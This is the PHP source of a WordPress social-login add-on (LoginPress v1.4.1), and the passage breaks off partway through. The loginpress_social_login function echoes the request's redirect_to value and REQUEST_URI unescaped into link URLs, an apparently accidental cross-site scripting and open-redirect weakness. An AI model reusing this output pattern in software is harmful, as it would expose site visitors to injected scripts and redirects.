<?php
/**
* Plugin Name: LoginPress - Social Login
* Plugin URI: https://www.WPBrigade.com/wordpress/plugins/loginpress/
* Description: This is a premium add-on of LoginPress WordPress plugin by <a href="https://wpbrigade.com/">WPBrigade</a> which allows you to login using social media accounts like Facebook, Twitter and Google/G+ etc
* Version: 1.4.1
* Author: WPBrigade
* Author URI: https://www.WPBrigade.com/
* Text Domain: loginpress-social-login
* Domain Path: /languages
*
* @package loginpress
* @category Core
* @author WPBrigade
*/

if ( ! class_exists( 'LoginPress_Social' ) ) :

  final class LoginPress_Social {

    /**
    * @var string
    */
    public $version = '1.4.1';
    private $is_shortcode = false;

    /**
    * @var The single instance of the class
    * @since 1.0.0
    */
    protected static $_instance = null;

    /*
    * * * * * * * * *
    * Class constructor
    * * * * * * * * * */
    public function __construct() {

      $this->settings = get_option( 'loginpress_social_logins' );
      $this->define_constants();
      $this->_hooks();
    }

    public $settings;
    /**
    * Define LoginPress Constants
    */
    private function define_constants() {

      $this->define( 'LOGINPRESS_SOCIAL_PLUGIN_BASENAME', plugin_basename( __FILE__ ) );
      $this->define( 'LOGINPRESS_SOCIAL_DIR_PATH', plugin_dir_path( __FILE__ ) );
      $this->define( 'LOGINPRESS_SOCIAL_DIR_URL', plugin_dir_url( __FILE__ ) );
      $this->define( 'LOGINPRESS_SOCIAL_ROOT_PATH', dirname( __FILE__ ) . '/' );
      $this->define( 'LOGINPRESS_SOCIAL_VERSION', $this->version );
      $this->define( 'LOGINPRESS_SOCIAL_FEEDBACK_SERVER', 'https://wpbrigade.com/' );
    }

    /**
    * Hook into actions and filters
    *
    * @since  1.0.0
    * @version 1.3.0
    */
    private function _hooks() {

      $enable   = isset( $this->settings['enable_social_login_links'] ) ? $this->settings['enable_social_login_links'] : '';
      $login    = isset( $enable['login'] ) ? 'login' : '';
      $register = isset( $enable['register'] ) ? 'register' : '';

      if ( 'login' == $login ) {
        add_action( 'login_form', array( $this, 'loginpress_social_login' ) );
      }
      if ( 'register' == $register ) {
        add_action( 'register_form', array( $this, 'loginpress_social_login' ) );
      }
      add_action( 'plugins_loaded', array( $this, 'textdomain' ), 30 );
      add_filter( 'plugin_row_meta', array( $this, '_row_meta' ), 10, 2 );
      add_action( 'init', array( $this, 'session_init' ) );
      add_action( 'admin_init', array( $this, 'init_addon_updater' ), 0 );
      add_filter( 'loginpress_settings_tab', array( $this, 'settings_tab' ), 15 );
      add_filter( 'loginpress_settings_fields', array( $this, 'settings_field' ), 10 );
      add_action( 'loginpress_social_login_help_tab_script', array( $this, 'loginpress_social_login_help_tab_callback' ) );
      add_action( 'delete_user', array( $this, 'delete_user_row' ) );

      add_action( 'admin_enqueue_scripts', array( $this, 'loginpress_social_login_admin_action_scripts' ) );
      // perform the check when the_posts() function is called
      add_action( 'the_posts', array( $this, 'loginpress_social_login_scripts' ) );
      add_action( 'login_enqueue_scripts', array( $this, 'load_login_assets' ) );
      add_action( 'login_footer', array( $this, 'login_page_custom_footer' ) );

      add_filter('get_avatar', array( $this, 'insert_avatar' ), 1, 5);

      add_shortcode( 'loginpress_social_login', array( $this, 'loginpress_social_login_shortcode' ) );
    }

    /**
     * Add social avatar to user profile.
     */
    public function insert_avatar( $avatar = '', $id_or_email, $size = 96, $default = '', $alt = false ) {
      global $wpdb;
      $id = 0;

      if (is_numeric($id_or_email)) {
          $id = $id_or_email;
      } else if (is_string($id_or_email)) {
          $u = get_user_by('email', $id_or_email);
          $id = $u->id;
      } else if (is_object($id_or_email)) {
          $id = $id_or_email->user_id;
      }

      $table_name = "{$wpdb->prefix}loginpress_social_login_details";

      $avatar_query = $wpdb->prepare( "SELECT photo_url FROM `$table_name` WHERE user_id = %d", $id );
      $avatart_url_query = $wpdb->query( $avatar_query );

      if ( 1 == $avatart_url_query ) {
        $avatar_url = $wpdb->get_results( $avatar_query );
        $avatar_url = $avatar_url[0]->photo_url;
        $avatar = preg_replace('/src=("|\').*?("|\')/i', 'src=\'' . $avatar_url . '\'', $avatar);
        $avatar = preg_replace('/srcset=("|\').*?("|\')/i', 'srcset=\'' . $avatar_url . '\'', $avatar);
      }

      return $avatar;
    }

    /**
    * LoginPress Addon updater
    */
    public function init_addon_updater() {
      if ( class_exists( 'LoginPress_AddOn_Updater' ) ) {
        // echo 'Exists';
        $updater = new LoginPress_AddOn_Updater( 2335, __FILE__, $this->version );
      }
    }

    public function settings_field( $setting_array ) {

      $_new_tabs = array(
        array(
          'name'  => 'facebook',
          'label' => __( 'Facebook Login', 'loginpress-social-login' ),
          'desc'  => __( 'Enable Facebook Login', 'loginpress-social-login' ),
          'type'  => 'checkbox',
        ),
        array(
          'name'  => 'facebook_app_id',
          'label' => __( 'Facebook App ID', 'loginpress-social-login' ),
          'desc'  => sprintf( __( 'Enter your facebook App ID.', 'loginpress-social-login' ), '<a href="https://wpbrigade.com/">', '</a>' ),
          'type'  => 'text',
        ),
        array(
          'name'  => 'facebook_app_secret',
          'label' => __( 'Facebook App Secret', 'loginpress-social-login' ),
          'desc'  => sprintf( __( 'Enter your facebook App Secret.', 'loginpress-social-login' ), '<a href="https://wpbrigade.com/">', '</a>' ),
          'type'  => 'text',
        ),
        array(
          'name'  => 'twitter',
          'label' => __( 'Twitter Login', 'loginpress-social-login' ),
          'desc'  => __( 'Enable Twitter Login', 'loginpress-social-login' ),
          'type'  => 'checkbox',
        ),
        array(
          'name'  => 'twitter_oauth_token',
          'label' => __( 'Twitter API key', 'loginpress-social-login' ),
          'desc'  => sprintf( __( 'Enter Your Consumer API key.', 'loginpress-social-login' ), '<a href="https://wpbrigade.com/">', '</a>' ),
          'type'  => 'text',
        ),
        array(
          'name'  => 'twitter_token_secret',
          'label' => __( 'Twitter API secret key', 'loginpress-social-login' ),
          'desc'  => sprintf( __( 'Enter Your Consumer API secret key.', 'loginpress-social-login' ), '<a href="https://wpbrigade.com/">', '</a>' ),
          'type'  => 'text',
        ),
        array(
          'name'  => 'twitter_callback_url',
          'label' => __( 'Twitter Callback URL', 'loginpress-social-login' ),
          'desc'  => __( 'Enter Your Callback URL ' . wp_login_url(), 'loginpress-social-login' ),
          'type'  => 'text',
        ),
        array(
          'name'  => 'gplus',
          'label' => __( 'Google Login', 'loginpress-social-login' ),
          'desc'  => __( 'Enable Google Login', 'loginpress-social-login' ),
          'type'  => 'checkbox',
        ),
        array(
          'name'  => 'gplus_client_id',
          'label' => __( 'Client ID', 'loginpress-social-login' ),
          'desc'  => sprintf( __( 'Enter Your Client ID.', 'loginpress-social-login' ), '<a href="https://wpbrigade.com/">', '</a>' ),
          'type'  => 'text',
        ),
        array(
          'name'  => 'gplus_client_secret',
          'label' => __( 'Client Secret', 'loginpress-social-login' ),
          'desc'  => sprintf( __( 'Enter Your Client Secret.', 'loginpress-social-login' ), '<a href="https://wpbrigade.com/">', '</a>' ),
          'type'  => 'text',
        ),
        array(
          'name'  => 'gplus_redirect_uri',
          'label' => __( 'Redirect URI', 'loginpress-social-login' ),
          'desc'  => __( 'Enter Your Redirect URI:' . wp_login_url() . '?lpsl_login_id=gplus_login', 'loginpress-social-login' ),
          'type'  => 'text',
        ),
        array(
          'name'  => 'linkedin',
          'label' => __( 'LinkedIn Login', 'loginpress-social-login' ),
          'desc'  => __( 'Enable LinkedIn Login', 'loginpress-social-login' ),
          'type'  => 'checkbox',
        ),
        array(
          'name'  => 'linkedin_client_id',
          'label' => __( 'Client ID', 'loginpress-social-login' ),
          'desc'  => sprintf( __( 'Enter Your Client ID.', 'loginpress-social-login' ), '<a href="https://wpbrigade.com/">', '</a>' ),
          'type'  => 'text',
        ),
        array(
          'name'  => 'linkedin_client_secret',
          'label' => __( 'Client Secret', 'loginpress-social-login' ),
          'desc'  => sprintf( __( 'Enter Your Client Secret.', 'loginpress-social-login' ), '<a href="https://wpbrigade.com/">', '</a>' ),
          'type'  => 'text',
        ),
        array(
          'name'  => 'linkedin_redirect_uri',
          'label' => __( 'Redirect URI', 'loginpress-social-login' ),
          'desc'  => __( 'Enter Your Redirect URI: ' . wp_login_url() . '?lpsl_login_id=linkedin_login', 'loginpress-social-login' ),
          'type'  => 'text',
        ),
        array(
          'name'    => 'enable_social_login_links',
          'label'   => __( 'Enable Social Login on', 'loginpress-social-login' ),
          'desc'    => __( 'Enable Social Login on Login and Register form', 'loginpress-social-login' ),
          'type'    => 'multicheck',
          // 'default' => array( 'login' => 'login' ),
          'options' => array(
            'login'    => 'Login Form',
            'register' => 'Register Form',
          ),
        ),
        array(
          'name'  => 'delete_user_data',
          'label' => __( 'Remove Record On Uninstall', 'loginpress-social-login' ),
          'desc'  => __( 'This tool will remove all LoginPress - Social Logins record upon uninstall.', 'loginpress-social-login' ),
          'type'  => 'checkbox',
        ),
      );

      $_new_tabs = array( 'loginpress_social_logins' => $_new_tabs );
      return( array_merge( $_new_tabs, $setting_array ) );
    }

    function loginpress_social_login_admin_action_scripts( $hook ) {
      if ( 'toplevel_page_loginpress-settings' == $hook ) {
        wp_enqueue_style( 'loginpress-admin-social-login', plugins_url( 'assets/css/style.css', __FILE__ ), array(), LOGINPRESS_SOCIAL_VERSION );
        wp_enqueue_script( 'loginpress-admin-social-login', plugins_url( 'assets/js/main.js', __FILE__ ), false, LOGINPRESS_SOCIAL_VERSION );
      }
    }

    /**
     * [loginpress_social_login_scripts description]
     * @param  [type] $posts [description]
     * @return [type]        [description]
     */
    function loginpress_social_login_scripts( $posts ) {
        if ( empty( $posts ) )
            return $posts;

        // false because we have to search through the posts first
        $allow = false;

        // search through each post
        foreach ( $posts as $post ) {
            // check the post content for the short code
            if ( stripos( $post->post_content, 'loginpress_social_login') )
                // we have found a post with the short code
                $allow = true;
                // stop the search
            break;
        }
        if ( $allow ) {
            wp_enqueue_style( 'font-awesome', 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css' );
            wp_enqueue_style( 'loginpress-social-login', plugins_url( 'assets/css/login.css', __FILE__ ), array(), LOGINPRESS_SOCIAL_VERSION );
        }
        return $posts;
    }

    function settings_tab( $loginpress_tabs ) {
      $new_tab = array(
        array(
          'id'    => 'loginpress_social_logins',
          'title' => __( 'Social Login', 'loginpress' ),
          'desc'  => sprintf( __( '%1$s%3$sSettings%4$s %5$sHelp%4$s%2$s', 'loginpress-social-login' ), '<div class="loginpress-social-login-tab-wrapper">', '</div>', '<a href="#loginpress_social_login_settings" class="loginpress-social-login-tab loginpress-social-login-active">', '</a>', '<a href="#loginpress_social_login_help" class="loginpress-social-login-tab">' ),
        ),
      );
      return array_merge( $loginpress_tabs, $new_tab );

    }

    function loginpress_social_login_help_tab_callback() {

      if ( ! class_exists( 'LoginPress_Promotion_tabs' ) ) {
        include LOGINPRESS_DIR_PATH . 'classes/class-loginpress-promotion.php';
      }
      $video_html = new LoginPress_Promotion_tabs();

      $html  = '<div id="loginpress_social_login_help" class="display">';
      $html .= '<div class="loginpress-social-accordions">';
      $html .= '<a href="#loginpress-facebook-login" class="loginpress-accordions">Facebook Login <span class="dashicons dashicons-arrow-down loginpress-arrow"></span></a>';
      $html .= '<div class="loginpress-social-tabs" id="loginpress-facebook-login">
      <h2>Let\'s integrate Facebook login with LoginPress Social Login.</h2>
      <p>Following are the steps to Create an app on Facebook to use Facebook Login in a web application.</p>
      <h4>Step 1:</h4>
      <ul>
      <li>1.1 Go to <a href="https://developers.facebook.com/" target="_blank">Facebook Developers</a> section and login to your Facebook account, if you are not logged in already. This should not be your business account.</li>
      </ul>
      <h4>Step 2:</h4>
      <ul>
      <li>2.1 If you are here (at Facebook Developer section) first time.</li>
      <li>&nbsp;&nbsp;&nbsp;&nbsp;2.1.1 You will be required to “Create a Facebook for Developers account”. Click “Create First App” button.</li>
      <li>&nbsp;&nbsp;&nbsp;&nbsp;2.1.2 Fill out the form. (Display Name, Contact Email) and click on “Create App ID”.</li>
      <li>&nbsp;&nbsp;&nbsp;&nbsp;2.1.3 Select a Scenario here. In our case it\'s “Integrate Facebook Login”. Select it and click on “Confirm button”.</li>
      <li>2.2 If you have registered already.</li>
      <li>&nbsp;&nbsp;&nbsp;&nbsp;2.2.1 Click “Create App” from “My Apps” and fill out the required informational fields.</li>
      <li>&nbsp;&nbsp;&nbsp;&nbsp;2.2.2 Fill out the form. (Display Name, Contact Email) and click on “Create App ID”.</li>
      <li>&nbsp;&nbsp;&nbsp;&nbsp;2.2.3 After you have created the App, please select a product type here. In our case, we use “Facebook login”.</li>
      <li>&nbsp;&nbsp;&nbsp;&nbsp;2.2.4 Select the platform for this app: Here we use "web".</li>
      <li>&nbsp;&nbsp;&nbsp;&nbsp;2.2.5 Enter your web URL <strong>' . esc_html( site_url() ) . '</strong> and save the settings.</li>
      </ul>
      <h4>Step 3:</h4>
      <ul>
      <li>3.1 Go to Settings &gt; Basic from the left side menu.</li>
      <li>3.2 Fill out the required fields (Contact Email, App Domains, and Privacy Policy URL).</li>
      <li>3.3 Here you find the App ID and App Secret.</li>
      <li>3.4 Copy that ID & Secret and use it in our plugin settings.</li>
      <li>3.5 Save the settings.</li>
      </ul>
      <h4>Step 4:</h4>
      <ul>
      <li>4.1 Go to Facebook Login &gt; Settings from left side menu.</li>
      <li>4.2 There Please set the <b>Use Strict Mode for Redirect URIs</b> as Yes.</li>
      <li>4.3 Add valid OAuth redirect URIs here:
      <li>&nbsp;&nbsp;&nbsp;&nbsp;4.3.1 <strong>' . esc_html( wp_login_url() . '?lpsl_login_id=facebook_check' ) . '</strong></li>
      <li>&nbsp;&nbsp;&nbsp;&nbsp;4.3.2 <strong>' . esc_html( site_url() . '/admin.php?lpsl_login_id=facebook_check' ) . '</strong></li>
      </li>
      <li>4.4 Save the settings.</li>
      </ul>
      <h4>Step 5:</h4>
      <ul>
      <li>5.1 Final Step make this App public. For this, You just need to slide the checkbox that you see on topbar.</li>
      <li>5.2 After that select the category and press confirm button.</li>
      <li>5.3 Save the settings and enjoy it.</li>
      </ul>';
      $html .= $video_html->_addon_video( 'Helping video for Facebook Authentication', 'HhR5J7sdVXw' ) . '</div></div>';
      $html .= '<div class="loginpress-social-accordions">';
      $html .= '<a href="#loginpress-facebook-login" class="loginpress-accordions">Twitter Login <span class="dashicons dashicons-arrow-down loginpress-arrow"></span></a>';
      $html .= '<div class="loginpress-social-tabs" id="loginpress-twitter-login">
      <h2>Let\'s integrate Twitter login with LoginPress Social Login.</h2>
      <p>Following are the steps to create an app on Twitter to use Twitter Login in a web application.</p>
      <h4>Step 1:</h4>
      <ul>
      <li>1.1 You must register your website with Twitter at <a href="https://developer.twitter.com/en/apps" target="_blank">https://developer.twitter.com/en/apps</a>.</li>
      <li>1.2 Click on “Create an App” Button and fill out the required informational fields.</li>
      <li>&nbsp;&nbsp;1.2.1 Website URL: <strong>' . esc_html( site_url() ) . '</strong></li>
      <li>&nbsp;&nbsp;1.2.2 Callback URL: <strong>' . esc_html( wp_login_url() ) . '</strong></li>
      <li>1.3 Click on "Create" button.</li>
      <li>1.4 After that, a popup will appear for “Review Developer Terms”. Read the terms and click on create button.</li>
      </ul>
      <h4>Step 2:</h4>
      <ul>
      <li>2.1 Go to “Keys and access token” tab.</li>
      <li>2.2 Copy that Key and Token under “Consumer API Keys” heading and use it in plugin settings.</li>
      <li>2.3 Save the settings and enjoy.</li>
      </ul>';
      $html .= $video_html->_addon_video( 'Helping video for Twitter Authentication', '2IVyvNws5rE' ) . '</div></div>';
      $html .= '<div class="loginpress-social-accordions">';
      $html .= '<a href="#loginpress-facebook-login" class="loginpress-accordions">Google login <span class="dashicons dashicons-arrow-down loginpress-arrow"></span></a>';
      $html .= '<div class="loginpress-social-tabs" id="loginpress-gplus-login">
      <h2>Let\'s integrate Google login with LoginPress Social Login.</h2>
      <p>Following are the steps to Create an app on Google to use Google Login in a web application.</p>
      <h4>Step 1:</h4>
      <ul>
      <li>1.1 You must register your website with Google APIs at <a href="https://console.developers.google.com/" target="_blank">https://console.developers.google.com/</a>.</li>
      <li>1.2 Click on “Create” button and fill out the required informational fields. (Project Name)</li>
      <li>&nbsp;&nbsp;1.2.1 If you have more then 1 project in Google APIs, please confirm your project from top left dropdown project list.</li>
      <li>1.3 Click on “OAuth consent screen” from the left side menu and fill out the required informational fields. (Application Name, Authorized domains).</li>
      <li>1.4 Save the settings.</li>
      </ul>
      <h4>Step 2:</h4>
      <ul>
      <li>2.1 After saving the OAuth consent screen settings, you will be redirected on the Credentials page.</li>
      <li>2.2 Please select “OAuth Client ID” from “Create Credential” dropdown.</li>
      <li>2.3 Select the Application type here. In our case it\'s “Web application”.</li>
      <li>2.4 Fill out the required informational fields (Name & Authorized redirect URIs) save the settings.</li>
      <li>&nbsp;&nbsp;2.4.1 Authorized redirect URIs: <strong>' . esc_html( wp_login_url() . '?lpsl_login_id=gplus_login' ) . '</strong></li>
      </ul>
      <h4>Step 3:</h4>
      <ul>
      <li>3.1 After saving the settings, a popup will appear with “OAuth Client Created” heading. </li>
      <li>3.2 Copy the Client ID and Client Secret from here and paste it in our plugin setting.</li>
      <li>3.3 Paste the Authorized redirect URIs: <strong>' . esc_html( wp_login_url() . '?lpsl_login_id=gplus_login' ) . '</strong> .</li>
      <li>3.4 Save the settings and enjoy.</li>
      </ul>';
      $html .= $video_html->_addon_video( 'Helping video for Google Authentication', 'slG76UHkFRw' ) . '</div></div>';
      $html .= '<div class="loginpress-social-accordions">';
      $html .= '<a href="#loginpress-facebook-login" class="loginpress-accordions">LinkedIn login <span class="dashicons dashicons-arrow-down loginpress-arrow"></span></a>';
      $html .= '<div class="loginpress-social-tabs" id="loginpress-linkedin-login">
      <h2>Let\'s integrate LinkedIn login with LoginPress Social Login.</h2>
      <p>Following are the steps to create an app on Linkedin to use Signin with LinkedIn using LoginPress.</p>
      <ol>
      <li>You must register your website with LinkedIn at <a href="https://developer.linkedin.com/" target="_blank">https://developer.linkedin.com/</a></li>
      <li>Click on <a href="https://www.linkedin.com/developers/apps/new" target="_blank">My Apps</a> to Create a LinkedIn Application and fill out the required informational fields on the form.</li>
      <li>After submitting the form, Check out the Auth tab in your newly created App. Auth tab will have Redirect URLs and Credentials.</li>
      <li>Copy this <strong>' . esc_html( wp_login_url() . '?lpsl_login_id=linkedin_login' ) . '</strong> link and paste in Authorized Redirect URLs.</li>
      <li>Copy that Client ID &amp; Client Secret from Auth Tab and paste it in plugin settings.</li>
      <li>Save the settings of Social Login.</li>
      <li>Logout from WordPress and checkout the login page again to see the LinkedIn Sign In in effect.</li>
      </ol>
      </div></div>';
      $html .= '</div>';
      echo $html;
    }


    /**
    * Main Instance
    *
    * @since 1.0.0
    * @static
    * @see loginPress_social_loader()
    * @return Main instance
    */
    public static function instance() {
      if ( is_null( self::$_instance ) ) {
        self::$_instance = new self();
      }
      return self::$_instance;
    }


    /**
    * Load Languages
    *
    * @since 1.0.0
    */
    public function textdomain() {

      $plugin_dir = dirname( plugin_basename( __FILE__ ) );
      load_plugin_textdomain( 'loginpress-social-login', false, $plugin_dir . '/languages/' );
    }

    // starts the session with the call of init hook
    function session_init() {
			if ( isset( $_GET['lpsl_login_id'] ) ) {
				if ( ! session_id() && ! headers_sent() ) {
					session_start();
				}
			}

      include_once LOGINPRESS_SOCIAL_DIR_PATH . 'classes/loginpress-social-check.php';
    }

    /** Check to see if the current page is the login/register page.
    *
    * @return bool
    */
    function is_login_page() {
			$total_pages = array( 'wp-login.php', 'wp-register.php' );
			$translatpress_page = array( 'index.php' );														
			if( is_plugin_active( 'translatepress-multilingual/index.php' ) ) {		
				$total_pages = array_merge( $total_pages, $translatpress_page );		//If TranslatePress add language-code to domain attribute is set
			}
			return in_array( $GLOBALS['pagenow'], $total_pages, true );

    }

    /**
     * Social login shortcode callback.
     * @since 1.3.0
		 * @param $atts attributes of shortcode
		 * 
     */
    function loginpress_social_login_shortcode( $atts ) {
      $atts = shortcode_atts(
        array(
          'disable_google'    => 'false',
          'disable_facebook'  => 'false',
          'disable_twitter'   => 'false',
          'disable_linkedin'  => 'false',
					'display'           => 'row',
					'social_redirect_to' => 'true'
        ),
        $atts
      );
      $this->is_shortcode = true;

			ob_start(); ?>
			
     	<div class="loginpress-sl-shortcode-wrapper">
				<?php $this->loginpress_social_login( $atts ); ?> 
      </div> 

			<?php return ob_get_clean();
    }

    /**
     * HTML struture for social login buttons.
     * @since 1.0.0
     * @version 1.3.0
		 * @param $atts attributes of shortcode 
     */
    public function loginpress_social_login( $atts ) {
      if( ! LoginPress_Social::check_social_api_status() ) // v1.0.7
				return;
				
				if( is_user_logged_in() ){
					return;
				}

				$redirect_to = isset( $_REQUEST['redirect_to'] ) ? $_REQUEST['redirect_to'] : '';
				$encoded_url = '';
				$social_encoded_url = '';
				if( !empty($atts['social_redirect_to']) && $atts['social_redirect_to'] == 'true') {
				$social_redirect_to =  $atts['social_redirect_to'] == 'true' ? site_url() . $_SERVER['REQUEST_URI'] : site_url();
				$social_encoded_url = urlencode( $social_redirect_to );
				}
				$encoded_url = urlencode( $redirect_to );
      	$display_style = ( isset( $atts['display'] ) && 'column' == $atts['display'] ) ? 'block loginpress-social-display-col' : 'block'; // v1.3.0 ?>

      <div class='social-networks <?php echo $display_style; ?>'>

        <?php if( $this->is_login_page() ) : ?>
          <span class="social-sep"><span><?php _e( 'or', 'loginpress-social-login' ); ?></span></span>
        <?php endif;

        do {
          if ( true === $this->is_shortcode && 'true' === $atts['disable_google'] ) {
            break;
          }

          if ( isset( $this->settings['gplus'] ) && $this->settings['gplus'] == 'on' && ! empty( $this->settings['gplus_client_id'] ) && ! empty( $this->settings['gplus_client_secret'] ) ) : ?>

            <a href="<?php echo wp_login_url(); ?>?lpsl_login_id=gplus_login
            <?php
            if ( $encoded_url ) {
              echo '&state=' . base64_encode( "redirect_to=$encoded_url" ). "&redirect_to=$redirect_to";
						}
						if ( !empty( $social_encoded_url )  ) {
              echo '&state=' . base64_encode( "redirect_to=$social_encoded_url" ). "&redirect_to=$social_redirect_to";
            }

            ?>
            " title='
            <?php
            _e( 'Login with Google', 'loginpress-social-login' );
            ?>
            ' >
            <div class="lpsl-icon-block icon-google-plus clearfix">

              <span class="lpsl-login-text"><?php _e( 'Login with Google', 'loginpress-social-login' ); ?></span>
              <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="18px" height="18px" viewBox="0 0 48 48" class="abcRioButtonSvg lpsl-google-svg"><g><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path><path fill="none" d="M0 0h48v48H0z"></path></g></svg>
            </div>
          </a>

          <?php
          endif;
        } while (0);

        do {
          if ( true === $this->is_shortcode && 'true' === $atts['disable_facebook'] ) {
            break;
          }

          if ( isset( $this->settings['facebook'] ) && $this->settings['facebook'] == 'on' && ! empty( $this->settings['facebook_app_id'] ) && ! empty( $this->settings['facebook_app_secret'] ) ) : ?>

            <a href="<?php echo wp_login_url(); ?>?lpsl_login_id=facebook_login
              <?php
              if ( $encoded_url ) {
                echo '&state=' . base64_encode( "redirect_to=$encoded_url" ) . "&redirect_to=$redirect_to";
							}
							if ( !empty( $social_encoded_url ) ) {
								echo '&state=' . base64_encode( "redirect_to=$social_encoded_url" ). "&redirect_to=$social_redirect_to";
							}
              ?>
              " title='
              <?php
              _e( 'Login with Facebook', 'loginpress-social-login' );
              ?>
              ' >
              <div class="lpsl-icon-block icon-facebook clearfix">
                <span class="lpsl-login-text"><?php _e( 'Login with Facebook', 'loginpress-social-login' ); ?></span>
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="#43609c" d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/></svg>
              </div>
            </a>

          <?php
          endif;
        } while (0);

        do {
          if ( true === $this->is_shortcode && 'true' === $atts['disable_twitter'] ) {
            break;
          }

          if ( isset( $this->settings['twitter'] ) && $this->settings['twitter'] == 'on' && ! empty( $this->settings['twitter_oauth_token'] ) && ! empty( $this->settings['twitter_token_secret'] ) ) : ?>

            <a href="<?php echo wp_login_url(); ?>?lpsl_login_id=twitter_login
              <?php
              if ( $encoded_url ) {
                echo '&state=' . base64_encode( "redirect_to=$encoded_url" ) . "&redirect_to=$redirect_to";
							}
							if ( !empty( $social_encoded_url ) ) {
								echo '&state=' . base64_encode( "redirect_to=$social_encoded_url" ). "&redirect_to=$social_redirect_to";
							}
              ?>
              " title='
              <?php
              _e( 'Login with Twitter', 'loginpress-social-login' );
              ?>
              ' >
              <div class="lpsl-icon-block icon-twitter clearfix">

                <span class="lpsl-login-text"><?php _e( 'Login with Twitter', 'loginpress-social-login' ); ?></span>
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="#1da1f3" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
              </div>
            </a>

          <?php
          endif;
        } while (0);

        do {
          if ( true === $this->is_shortcode && 'true' === $atts['disable_linkedin'] ) {
            break;
          }

          if ( isset( $this->settings['linkedin'] ) && $this->settings['linkedin'] == 'on' && ! empty( $this->settings['linkedin_client_id'] ) && ! empty( $this->settings['linkedin_client_secret'] ) ) : ?>

            <a href="<?php echo wp_login_url(); ?>?lpsl_login_id=linkedin_login
              <?php
              if ( $encoded_url ) {
                echo '&state=' . base64_encode( "redirect_to=$encoded_url" ) . "&redirect_to=$redirect_to";
							}
							if ( !empty( $social_encoded_url ) ) {
								echo '&state=' . base64_encode( "redirect_to=$social_encoded_url" ). "&redirect_to=$social_redirect_to";
							}
              ?>
              " title='
              <?php
              _e( 'Login with LinkedIn', 'loginpress-social-login' );
              ?>
              ' >
              <div class="lpsl-icon-block icon-linkdin clearfix">

                <span class="lpsl-login-text"><?php _e( 'Login with LinkedIn', 'loginpress-social-login' ); ?></span>
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="#0076b4" d="M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"/></svg>
              </div>
            </a>

          <?php
          endif;
        } while (0); ?>

      </div>
      <?php
    }

    /**
     * Check Social Media Status from settings API.
     * @return boolean
     * @since 1.0.7
     */
    public static function check_social_api_status() {
      $options = get_option( 'loginpress_social_logins' );

      if ( ( ( isset( $options['gplus'] ) && $options['gplus'] == 'on' ) && ( ! empty( $options['gplus_client_id'] ) && ! empty( $options['gplus_client_secret'] ) ) )
      || ( ( isset( $options['facebook'] ) && $options['facebook'] == 'on' ) && (  ! empty( $options['facebook_app_id'] ) && ! empty( $options['facebook_app_secret'] ) ) )
      || ( ( isset( $options['twitter'] ) && $options['twitter'] == 'on' ) && (  ! empty( $options['twitter_oauth_token'] ) && ! empty( $options['twitter_token_secret'] ) ) )
      || ( ( isset( $options['linkedin'] ) && $options['linkedin'] == 'on' ) && (  ! empty( $options['linkedin_client_id'] ) && ! empty( $options['linkedin_client_secret'] ) ) ) ) {
        return true;
      } else {
        return false;
      }

    }

    /**
    * Include Social LoginPress script in footer.
    *
    * @since	1.0.7
    * * * * * * * * * * * * * * * */
    public function login_page_custom_footer() {

      if( ! LoginPress_Social::check_social_api_status() )
        return;

      include( LOGINPRESS_SOCIAL_DIR_PATH . 'assets/js/script-login.php' );
    }

    /**
    * Define constant if not already set
    *
    * @param  string      $name
    * @param  string|bool $value
    */
    private function define( $name, $value ) {
      if ( ! defined( $name ) ) {
        define( $name, $value );
      }
    }

    /**
    * Define constant if not already set
    *
    * @param  array       $links
    * @param  string|bool $file
    */
    public function _row_meta( $links, $file ) {

      if ( strpos( $file, 'loginpress-social-login.php' ) !== false ) {

        // Set link for Reviews.
        $new_links = array(
